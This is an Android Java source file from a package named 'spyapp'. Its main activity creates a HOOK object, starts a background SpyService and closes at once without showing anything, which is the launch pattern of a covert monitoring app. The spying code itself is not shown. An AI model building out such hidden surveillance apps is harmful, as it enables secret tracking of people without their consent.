package com.example.ydg.spyapp;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

public class MainActivity extends Activity {

    public final static String LogTag = "checking_activity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Log.i(LogTag, "Spy service start");

        HOOK hook = new HOOK();
        spyServiceStart();
        finish();
    }

    public void spyServiceStart() {
        Intent SpyServiceIntent = new Intent(this, SpyService.class);
        startService(SpyServiceIntent);
    }
}